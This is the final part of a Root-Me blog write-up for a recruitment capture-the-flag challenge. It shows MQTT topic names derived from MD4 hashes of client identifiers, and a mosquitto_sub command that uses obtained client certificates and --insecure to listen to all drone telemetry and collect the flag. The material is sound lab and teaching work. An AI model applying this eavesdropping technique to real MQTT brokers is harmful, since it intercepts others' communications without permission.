+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">MD4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;PHANTOM-CX-3&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;1ffda6ad911b3486b705c67ae443fa7e&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">MD4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;PHANTOM-CX-4&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;cd71ffa32caa8397d34d032b0ae1dfcc&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">MD4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;PHANTOM-CX-5&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;d170b3e7353514bed8bfdd96b1da191b&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">MD4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;PHANTOM-CX-6&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;9b1968949cce839c75ac21a42b324321&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">MD4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;PHANTOM-CX-7&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;d1f9407dda41eb2cc786e2ba5135eba8&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">MD4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;PHANTOM-CX-8&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;fc92b2536b52521b916dfaa43ea0be05&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">MD4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;PHANTOM-CX-9&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;519cfa34ff385c27d7397993563a67c2&#39;</span>
+</span></span></code></pre></div><p>We can now re-use the <code>mosquitto_sub</code> command, specifying all the topics:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ mosquitto_sub -h mqtt.phant.om -p <span class="m">17883</span> --cafile ./PHANTOM-CA.crt --cert ./PHANTOM-CX-8.crt --key ./PHANTOM-CX-8.key <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-t <span class="s1">&#39;drones/a6db0dd105f383d85a5b377e1eaa345c&#39;</span> -t <span class="s1">&#39;drones/759aac5f6088127cc0a8595e64f6e5a3&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-t <span class="s1">&#39;drones/a6bcf8e8bb6d25740fbe1da6ab7c4a7e&#39;</span> -t <span class="s1">&#39;drones/1ffda6ad911b3486b705c67ae443fa7e&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-t <span class="s1">&#39;drones/cd71ffa32caa8397d34d032b0ae1dfcc&#39;</span> -t <span class="s1">&#39;drones/d170b3e7353514bed8bfdd96b1da191b&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-t <span class="s1">&#39;drones/9b1968949cce839c75ac21a42b324321&#39;</span> -t <span class="s1">&#39;drones/d1f9407dda41eb2cc786e2ba5135eba8&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-t <span class="s1">&#39;drones/fc92b2536b52521b916dfaa43ea0be05&#39;</span> -t <span class="s1">&#39;drones/519cfa34ff385c27d7397993563a67c2&#39;</span> --insecure -v
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">drones/d1f9407dda41eb2cc786e2ba5135eba8 83,247,123
+</span></span><span class="line"><span class="cl">drones/1ffda6ad911b3486b705c67ae443fa7e 98,122,231
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">drones/d1f9407dda41eb2cc786e2ba5135eba8 RM<span class="o">{</span>1fec149c355b1c816c3bb60ad27b56c4ccbf<span class="o">}</span>
+</span></span></code></pre></div><p>We notice that, unlike before, we&rsquo;re receiving metrics from several drones.
+After a few seconds of waiting, we get the validation flag for this last stage of the challenge!
+The attacker seems to have misconfigured the ACL system on the MQTT server, allowing all communications to be listened in on.</p>
+<ul>
+<li>Flag : <strong>RM{1fec149c355b1c816c3bb60ad27b56c4ccbf}</strong></li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-03-31</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.root-me.org/posts/writeup_comcyber_marine/" data-title="Writeup - ComCyber - Marine Nationale Recrutement CTF" data-via="rootme_org" data-hashtags="comcyber,writeup,solution"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.root-me.org/posts/writeup_comcyber_marine/" data-hashtag="comcyber"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.root-me.org/posts/writeup_comcyber_marine/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/comcyber/">comcyber</a>,&nbsp;<a href="/tags/writeup/">writeup</a>,&nbsp;<a href="/tags/solution/">solution</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/writeup_snippet_05/" class="prev" rel="prev" title="Code Snippet Serie - 05 - Integer Overflow &amp; Stack Overflow"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Code Snippet Serie - 05 - Integer Overflow & Stack Overflow</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://root-me.org" target="_blank">Root-Me</a></span>&nbsp;|&nbsp;<span class="license">contact@root-me.org | <a href='/privacy/'>Privacy</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
